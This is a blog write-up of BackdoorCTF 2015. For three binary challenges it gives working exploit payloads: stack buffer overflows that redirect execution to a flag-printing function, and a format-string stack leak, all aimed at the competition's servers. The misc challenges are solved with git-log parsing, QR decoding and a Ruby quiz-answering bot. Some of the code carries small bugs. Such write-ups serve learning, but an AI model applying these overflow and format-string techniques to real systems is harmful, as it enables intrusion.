---
title: BackdoorCTF 2015 -- Binary + Misc
tags:
  - BackdoorCTF
  - CTF
  - Python
  - ruby
  - Pwnable
  - PPC
  - Misc
  - Forensic
categories:
  - write-ups
date: 2015-05-07 17:11:00
---
[BackdoorCTF 2015](https://backdoor.sdslabs.co/)  
For me, this is a challenge for CTF beginners. Most of the challenges are easy to solve, although some of them require some **"imagination"**...  

In this writeup, I'll post the solutions of all the binary challenges and the misc challenges that I solved in the CTF.  
<!-- more -->

# Binary
## echo
Basic BOF. Launch IDA Pro and we can see there's a gets() function in the main function. Just overwrite the return address to control the `eip` jump to the `sample()` function, which cat the flag.  
payload: `python -c 'print "A"*62+"\x4d\x85\x04\x08"' | nc hack.bckdr.in 8002`  

## team
Basic format string. To be honest I don't think this challenge worth 600 pt...  
The flag's on the stack. Just leak it with the format string vulnerability, wrote a script concat the string and bang, CTF  
payload: `%10$p.%11$p.%12$p.........%25$p`

``` python
temp = [35663364,64363031,................................]
flag = ""
for c in temp:
	flag += str(c).decode('hex')[::-1]
print "flag:", flag
```

## forgot
Another binary with the BOF vulnerability. It's a service that ask user to input their name and email address, and check the email address is whether a validate email address or not. 
Inspect the binary with IDA Pro, we found the following line has the BOF vulnerability:
`__isoc99_scanf("%s", &v11); // v11 = [bp-0x74]`
Moreover, there's a for loop with a switch-case in it to check the email address:
```c
for ( i = 0; ; ++i )  {
    v9 = i;
    if ( v9 >= strlen((const char *)&v11) )
      break;
    switch ( v23 )
    {
      case 1:.........
      case 2:.........
    }
}
```
To bypass the email address validation is simple, we just insert null byte in the beginning of the input, the `strlen()` will consider the string's length is 0 and stop the checking.  

I try to overwrite the return address first, which cause the program crash. So I switch to the IDA view and check the assembly, here's what I found:
```
.text:08048A58                 sub     dword ptr [esp+78h], 1
.text:08048A5D                 mov     eax, [esp+78h]
.text:08048A61                 mov     eax, [esp+eax*4+30h]
.text:08048A65                 call    eax
```

So apparently before the main function end, it does something really interesting. The program took a value that store on the stack, do some calculation, and store it in the eax before calling it. If we can make the value that store at `[esp+78h]` 0, we can call whatever we want by controling the value store at `[esp+30h]`. But who should we call? After checking the text view in IDA Pro, I found that there's one function that IDA Pro didn't decompile it into pseudo code.  

```
.text:080486CC                 push    ebp
.text:080486CD                 mov     ebp, esp
.text:080486CF                 sub     esp, 58h
.text:080486D2                 mov     dword ptr [esp+0Ch], offset a_Flag ; "./flag"
.text:080486DA                 mov     dword ptr [esp+8], offset aCatS ; "cat %s"
.text:080486E2                 mov     dword ptr [esp+4], 32h
.text:080486EA                 lea     eax, [ebp-3Ah]
.text:080486ED                 mov     [esp], eax
.text:080486F0                 call    _snprintf
.text:080486F5                 lea     eax, [ebp-3Ah]
.text:080486F8                 mov     [esp], eax
.text:080486FB                 call    _system
.text:08048700                 leave
.text:08048701                 retn
```

So just overwrite the stack, make `eax` be calculated to `0x080486CC`, then we can get the flag by executing the `call eax` instruction. Here's the payload:

```python
payload = "123\n" # name
payload += "\x00\x00\x00\x00" # for bypassing strlen
payload += "A"*28 # padding
payload += "\xcc\x86\x04\x08" # esp+0x30, print flag function
payload += "A"*68 # padding
payload += "\x01\x00\x00\x00" # esp+0x78
```

# Misc
## TIM
We got a github page, so it's seems like a git/forensic challenge. After cloning the repository and check the git log, we found some intereting stuff. 
```
commit d444f3227636477902c4badc8e35a27cadab456c
Author: Abhay Rana <capt.n3m0@gmail.com>
Date:   Tue Mar 31 17:59:09 2015 +0530

    Adds flag

commit 009d01e1b04bf2bf2d9bebd666e8d167fae1dc1a
Author: Abhay Rana <me@captnemo.in>
Date:   Tue Mar 31 17:59:08 2015 +0530

    47
    
    
    - 1518

commit 006d89cdd1a4ea3620bc6d4f865a2e341f5ee79a
Author: Abhay Rana <me@captnemo.in>
Date:   Tue Mar 31 17:59:08 2015 +0530

    41
    
    
    - 1527

commit 00df98e1685e093c643657c6b68d31b9948927aa
Author: Abhay Rana <me@captnemo.in>
Date:   Tue Mar 31 17:59:08 2015 +0530

    4c
    
........................    
```

It's seems like they convert some characters' ASCII code into hex values and committed it. After converting them back to the normal character, we got the following message:  
`Join first two characters of each commit sha1 FLAG`  
OK, so just do whatever it says, wrote a python script extract each commit sha1's first 2 characters and concat them, we'll get the flag. Notice that if the first 2 characters are "00", just ignore them.  
```python
ff = open("log", "r")
flag = []
for line in ff:
	if "commit" in line:
		if line[7:9:] != "00":
			flag.append(line[7:9])

print "".join(c for c in reversed(flag))
```

## QR
It's a service that gave us a bunch of QR codes, which require us to decode them & send the answers back to the server. The QR codes are generate randomly, so we'll have to write a script to solve them all. For me, I wrote a python script to parse the input into a 2D-array, and use the [Pillow](https://pillow.readthedocs.org/) library to transform the input into a png image, which contains the QR code. At first I try to use some python libraries to decode the QR code, including qrtools & zbar. Unfortunately, both of them weren't very effective, the correctness are kind of awful...so I finally decide to send the file to [ZXing](http://zxing.org/w/decode.jspx) and parse the response. This time, no error occurs. I finally got the flag after solving 100 QR codes.
```python
from socket import *
from PIL import Image
import sys
import re
import time
import requests

HOST="hack2.bckdr.in"
PORT=8010

sock = socket(AF_INET, SOCK_STREAM)
sock.connect((HOST, PORT))

def transform(array):
    print "transforming..."
    pixels = []
    height, width = len(array), len(array[0])
    print height, width
    for row in xrange(height):
		pixels.append([0xFF if c == 1 else 0 for c in array[row]])

	im = Image.new('L', (width, height))
	for y in range(height):
		for x in range(width):
			im.putpixel((x,y), pixels[y][x])
	
	width, height = width*5, height*10
	im = im.resize((width, height))

	im.save("test.png")
	print "transforming done"

def decode_qr():
    f = open("test.png")
    r =  requests.post(url='http://zxing.org/w/decode',files =  {'f':f})
    print r.status_code
    print r.headers
    return re.search("Parsed Result</td><td><pre>([0-9a-z]{64})</pre>", r.text).group(1)

print sock.recv(1024)
cur = 0

while True:
	print "round:", cur+1
	res = ""
	while True:
		r = sock.recv(10240)
        print r, cur+1
        if "Oops!" in r: break
        if not len(r): break
        res += r
		if re.search("\s{94}\n$", res) and len(res) > 100:
			break

	array = [[] for i in xrange(47)]
	index, row = 0, 0

	while index < len(res):
		now = ord(res[index])
		if now == 10:
			row += 1
		elif now == 32:
			array[row].append(1)
		else:
			array[row].append(0)
			index += 2
		index += 1

	transform(array)
	time.sleep(0.5)
  
  	while True:
	    answer = decode_qr()
      	print answer
      	if len(answer) == 64: break

	print answer.encode('hex'), len(answer)
	sock.send(answer)
	cur += 1

sock.close()
```

## RapidFire
Another service which give us a bunch of questions (**200** actually...) and ask us to solve all of them. The questions contains different categories, including:  

1. Math
    - Nth prime
    - Nth Fibonacci number
    - Nth digit in Pi
    - Sum of the first Nth natural numbers
    - Sum of the first Nth odd numbers
    - Sum of the first Nth Fibonacci numbers
    - Value of N in binary
2. Geography
    - Country of a city
    - Alpha2-code of a country
3. Misc
    - md5 hash
    - Release year of a movie

To solve all these problems, I use the follwing methods (in Ruby):

1. Math
    - Nth prime --> https://primes.utm.edu/nthprime/index.php
    - Nth Fibonacci number --> just calculate it
    - Nth digit in Pi --> http://www.eveandersson.com/pi/digits/1000000
    - Sum of the first Nth natural numbers --> n(n+1)/2
    - Sum of the first Nth odd numbers --> n^2
    - Sum of the first Nth Fibonacci numbers --> fib(n+2)-1
    - Value of N in binary --> n.to_s(2)
2. Geography
    - Country of a city --> http://maps.googleapis.com/maps/api/geocode/json
    - Alpha2-code of a country --> wiki
3. Misc
    - md5 hash --> require ‘digest’
    - Release year of a movie --> Rotten tomato API
        
Most of them are done by googling the solutions. I spent most of the time finding the solution for the last one -- **Release year of a movie**. This one almost drive me insane. I couldn't find a perfect solution for this kind of problem. It seems [IMDB](http://www.imdb.com/) has no public API for us to search the movie database, and the [Rotten Tomato API](http://developer.rottentomatoes.com/) sometimes return the wrong answer. Other movie database API are either too slow or just too crap to return the correct answers. At last I choose the Rotten Tomato API since there's no other solution. During solving this challenge, I found that sometimes I can made it to level 19X, while failing because of the wrong release year of the movie. So I finally decide to use the following command to run the script until I pass level 200:
```bash
while true; do ruby rapidfire.rb; done
```
Yeah take that rapidfire =.=  
**And guess what? I got the flag just before the end of the CTF !!! How lucky!!!**

Here's the ruby script I use. It's kind of dirty since I hard-code many special cases in the script:

```ruby
# encoding: utf-8
require 'socket'
require 'prime'
require 'digest'
require 'net/http'
require 'json'

HOST="128.199.107.60"
PORT=8008

def gen_codedb(code_db)
	cur_code = ""
	IO.foreach('code2.txt') do |line|
		line = line.strip()
		if line.length == 0
			next
		elsif line.length == 2
			cur_code = line
		else
			code_db[line] = cur_code
		end
	end
end

def solve_prime(n)
	ret = `curl -s -k -d "n=#{n.to_i}" https://primes.utm.edu/nthprime/index.php | grep "prime is"|tail -n 1 | awk '{print $5}' | tr -d ',.' `
	p ret
	return ret.strip()
end

def solve_fib(n)
	curr_num, next_num = 0, 1
	(n).times do
	   	curr_num, next_num = next_num, curr_num + next_num
	end  
	p curr_num
	curr_num
end 

def get_country(city)
	city = city.strip()
	if city == "Pristina"
		return "Kosovo"
	end
	if city == "Palikir"
		return "Federated States of Micronesia"
	end
	if city == "San Jose"
		return "Costa Rica"
	end
	if city == "Castries"
		return "Saint Lucia"
	end
	if city == "Nassau"
		return "Bahamas"
	end
	if city == "Nicosia"
		return "Cyprus"
	end
	if city == "Sao Tome"
		return "Sao Tome and Principe"
	end
	if city == "Belfast"
		return "Northern Ireland"
	end
	if city == "Victoria"
		return "Hong Kong"
	end
	if city == "Edinburgh"
		return "Scotland"
	end
	if city == "Skopje"
		return "Macedonia"
	end
	if city == "Kingston"
		return "Jamaica"
	end
	if city == "Georgetown"
		return "Guyana"
	end
	if city == "Cardiff"
		return "Wales"
	end
	if city == "Dili"
		return "Democratic Republic of Timor-Leste"
	end
	data = URI::encode("address="+city+"&sensor=false&language=en")
	uri = URI.parse('http://maps.googleapis.com/maps/api/geocode/json?'+data)
	res = Net::HTTP.get_response(uri)

	a = JSON.parse(res.body)
	for c in a["results"][0]["address_components"]
		if c["types"][0] == "country"
			p c["long_name"]
			if c["long_name"].to_s == "Côte d'Ivoire"
				#return "Côte"
				return "Ivory Coast"
			end
			if c["long_name"].to_s == "The Gambia"
				return "Gambia"
			end
			if c["long_name"].to_s == "United Kingdom"
				return "England"
			end
			return c["long_name"].to_s
		end
	end
end	

def get_movie_year(movie)
	if movie.strip() == "28 Days Later..."
		return "2002"
	end
	if movie.strip() == "Goliyon Ki Raasleela Ram-Leela"
		return "2013"
	end
	if movie.strip() == "Heer Ranjha - A True Love Story"
		return "2009"
	end
	if movie.strip() == "The Seven-Per-Cent Solution"
		return "1976"
	end
	if movie.strip() == "Human resources: Social engineering in the 20th century"
		return "2010"
	end
	if movie.strip() == "Long Da Lishkara"
		return "1986"
	end
	if movie.strip() == "300"
		return "2006"
	end
	if movie.strip() == "Inkheart"
		return "2008"
	end
	if movie.strip() == "The Expendables"
		return "2010"
	end
	if movie.strip() == "Ted"
		return "2012"
	end
	if movie.strip() == "The Seventh Horse of the Sun"
		return "1993"
	end
	if movie.strip() == "Jay-Z and Linkin Park - Collision Course"
		return "2004"
	end
	if movie.strip() == "Disconnect"
		return "2012"
	end
	if movie.strip() == "Howl's Moving Castle"
		return "2004"
	end
	if movie.strip() == "Die Hard"
		return "1988"
	end
	if movie.strip() == "You"
		return "2009"
	end
	if movie.strip() == "Good Boy"
		return "2009"
	end
	url = "http://api.rottentomatoes.com/api/public/v1.0/movies.json?apikey=[key]&q="+movie
	uri = URI.parse(URI.encode(url.strip))
	res = Net::HTTP.get_response(uri)
	a = JSON.parse(res.body)
	return a["movies"][0]["year"].to_s
end	

def get_country_code(c)
	if c == "Brazil"
		return "BR"
	end
	if c == "New Caledonia"
		return "NC"
	end
	if c == "Yemen"
		return "YD"
	end
	if c == "Sao Tome and Principe"
		return "ST"
	end
	if c == "Svalbard and Jan Mayen"
		return "SJ"
	end
	if c == "Uzbekistan"
		return "UZ"
	end
	if c == "Guinea-Bissau"
		return "GW"
	end
	if c == "Myanmar"
		return "MM"
	end
	if c == "Dominican Republic"
		return "DO"
	end
	if c == "Estonia"
		return "EE"
	end
	if c == "Costa Rica"
		return "CR"
	end
	if c == "Pakistan"
		return "PK"
	end
	if c == "Lesotho"
		return "LS"
	end
	if c == "Seychelles"
		return "SC"
	end
	if c == "British Indian Ocean Territory"
		return "IO"
	end
	if c == "South Sudan"
		return "SS"
	end
	if c == "Somalia"
		return "SO"
	end
	if c == "Hungary"
		return "HU"
	end
	if c == "United Arab Emirates"
		return "AE"
	end
	if c == "Guyana"
		return "GY"
	end
	data = URI::encode("address="+city+"&sensor=false&language=en")
	uri = URI.parse('http://maps.googleapis.com/maps/api/geocode/json?'+data)
	res = Net::HTTP.get_response(uri)

	a = JSON.parse(res.body)
	for c in a["results"][0]["address_components"]
		if c["types"][0] == "country"
			p c["short_name"]
			return c["short_name"]
		end
	end

	for country in $db
		name = country['Name'].encode('utf-8')
		if name == c
			return country['Code']  
		end
	end
end	

def get_pi(n)
	row, col = n / 50, n % 50
	cur_row = 0
	IO.foreach('pi.txt') do |line|
		line = line.strip()
		for i in 0...line.length
			if cur_row == row and i == col
				p line[i]
				return line[i]
			end
		end
		cur_row += 1
	end
end

def sum_n(n)
	ret = n*(n+1)/2
	p ret
	ret
end	

def get_binary(n)
	ret = n*(n+1)/2
	p ret
	ret
end	

def cal_md5(n)
	md5 = Digest::MD5.new
	md5.update n.to_s
	p md5.hexdigest  
	md5.hexdigest  
end

def sum_odd(n)
	ret = n**2
	p ret
	ret
end

code_db = {}
gen_codedb(code_db)

sock = TCPSocket.new(HOST, PORT)
ok = false
while true
	res = sock.recv(1024)
	if res.length == 0
		puts res
		break
	end
  # sleep 10 minute if it got the flag
	if ok == true and res.include? "flag"
		puts res
		sleep(600)
	end
	ok = true
	puts res
	if res.match(/(\d+)rd prime number/)
		n = res.match(/the (\d+)rd prime number/)[1].to_i
		puts "n: "+n.to_s
		answer = solve_prime(n+1).to_i
		sock.write answer.to_s+"\n"
	elsif res.match(/(\d+)st prime number/)
		n = res.match(/the (\d+)st prime number/)[1].to_i
		puts "n: "+n.to_s
		answer = solve_prime(n+1).to_i
		p "answer:"+answer.to_s
		sock.write answer.to_s+"\n"
	elsif res.match(/(\d+)th prime number/)
		n = res.match(/the (\d+)th prime number/)[1].to_i
		puts "n: "+n.to_s
		answer = solve_prime(n+1).to_i
		p "answer:"+answer.to_s
		sock.write answer.to_s+"\n"
	elsif res.match(/(\d+)nd prime number/)
		n = res.match(/the (\d+)nd prime number/)[1].to_i
		puts "n: "+n.to_s
		answer = solve_prime(n+1).to_i
		p "answer:"+answer.to_s
		sock.write answer.to_s+"\n"
	elsif res.match(/(\d+)nd fibonacci number/)
		n = res.match(/the (\d+)nd fibonacci number/)[1].to_i
		puts "n: "+n.to_s
		answer = solve_fib(n).to_i
		p "answer:"+answer.to_s
		sock.write answer.to_s+"\n"
	elsif res.match(/(\d+)rd fibonacci number/)
		n = res.match(/the (\d+)rd fibonacci number/)[1].to_i
		puts "n: "+n.to_s
		answer = solve_fib(n).to_i
		p "answer:"+answer.to_s
		sock.write answer.to_s+"\n"
	elsif res.match(/(\d+)st fibonacci number/)
		n = res.match(/the (\d+)st fibonacci number/)[1].to_i
		puts "n: "+n.to_s
		answer = solve_fib(n).to_i
		p "answer:"+answer.to_s
		sock.write answer.to_s+"\n"
	elsif res.match(/(\d+)th fibonacci number/)
		n = res.match(/the (\d+)th fibonacci number/)[1].to_i
		puts "n: "+n.to_s
		answer = solve_fib(n).to_i
		p "answer:"+answer.to_s
		sock.write answer.to_s+"\n"
	elsif res.match(/the country of/)
		n = res.match(/country of ([a-zA-Z,'\(\)\s]+)/)[1].to_s
		puts "city: "+n.to_s
		answer = get_country(n)
		p "answer:"+answer.to_s
		sock.write answer.to_s+"\n"
	elsif res.match(/sum of the first (\d+) natural numbers/)
		n = res.match(/sum of the first (\d+) natural numbers/)[1].to_i
		puts "n: "+n.to_s
		answer = sum_n(n).to_i
		p "answer:"+answer.to_s
		sock.write answer.to_s+"\n"
	elsif res.match(/sum of first (\d+) natural numbers/)
		n = res.match(/sum of first (\d+) natural numbers/)[1].to_i
		puts "n: "+n.to_s
		answer = sum_n(n).to_i
		p "answer:"+answer.to_s
		sock.write answer.to_s+"\n"
	elsif res.match(/the (\d+)th digit in pi/)
		n = res.match(/the (\d+)th digit in pi/)[1].to_i
		puts "n: "+n.to_s
		answer = get_pi(n-1).to_i
		p "answer:"+answer.to_s
		sock.write answer.to_s+"\n"
	elsif res.match(/the (\d+)rd digit in pi/)
		n = res.match(/the (\d+)rd digit in pi/)[1].to_i
		puts "n: "+n.to_s
		answer = get_pi(n-1).to_i
		p "answer:"+answer.to_s
		sock.write answer.to_s+"\n"
	elsif res.match(/the (\d+)nd digit in pi/)
		n = res.match(/the (\d+)nd digit in pi/)[1].to_i
		puts "n: "+n.to_s
		answer = get_pi(n-1).to_i
		p "answer:"+answer.to_s
		sock.write answer.to_s+"\n"
	elsif res.match(/the (\d+)st digit in pi/)
		n = res.match(/the (\d+)st digit in pi/)[1].to_i
		puts "n: "+n.to_s
		answer = get_pi(n-1).to_i
		p "answer:"+answer.to_s
		sock.write answer.to_s+"\n"
	elsif res.match(/md5 hash/)
		n = res.match(/md5 hash of (\d+)/)[1].to_i
		puts "n: "+n.to_s
		answer = cal_md5(n)
		p "answer:"+answer.to_s
		sock.write answer.to_s+"\n"
	elsif res.match(/sum of first (\d+) natural odd numbers/)
		n = res.match(/sum of first (\d+) natural odd numbers/)[1].to_i
		puts "n: "+n.to_s
		answer = sum_odd(n)
		p "answer:"+answer.to_s
		sock.write answer.to_s+"\n"
	elsif res.match(/sum of first (\d+) fibonacci numbers/)
		n = res.match(/sum of first (\d+) fibonacci numbers/)[1].to_i
		puts "n: "+n.to_s
		answer = solve_fib(n+2)-1
		p "answer:"+answer.to_s
		sock.write answer.to_s+"\n"
	elsif res.match(/value of (\d+) in binary/)
		n = res.match(/value of (\d+) in binary/)[1].to_i
		puts "n: "+n.to_s
		answer = n.to_s(2)
		p "answer:"+answer.to_s
		sock.write answer.to_s+"\n"
	elsif res.match(/the 2 digit code of/)
		n = res.match(/the 2 digit code of ([a-zA-Z,'\(\)\s]+)/)[1].to_s.strip()
		puts "n: "+n.to_s.strip()
		answer = code_db[n]
		p "answer:"+answer.to_s
		sock.write answer.to_s+"\n"
	elsif res.match(/release year of/)
		n = res.match(/release year of ([\S\s]+)/)[1].to_s
		puts "movie: "+n.to_s
		answer = get_movie_year(n)
		p "answer:"+answer.to_s
		sock.write answer.to_s+"\n"
	else 
	end
end
puts sock.recv(1024)	
sock.close

```
500 points for solving this challenge! Woo-hoo!